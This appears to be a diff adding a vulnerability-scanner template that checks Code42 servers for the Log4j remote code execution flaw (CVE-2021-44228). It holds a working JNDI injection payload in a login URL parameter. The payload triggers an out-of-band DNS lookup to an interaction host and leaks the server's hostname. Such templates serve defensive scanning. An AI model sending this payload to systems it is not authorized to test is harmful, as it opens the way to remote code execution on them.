@@ -1,0 +1,27 @@
+id: code42-log4j-rce
+brief:
+    title: Apache Code42 - Remote Code Execution (Apache Log4j)
+    by: Adam Crosser
+    level: critical
+    about: 'Multiple Code42 components are impacted by the logj4 vulnerability. Affected Code42 components include:'
+    label:
+        - cve
+        - cve2021
+        - jndi
+        - log4j
+        - rce
+        - oast
+        - code42
+        - kev
+        - vuln
+    score: CVE-2021-44228 CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/c42api/v3/LoginConfiguration?username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&url=https://localhost'
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
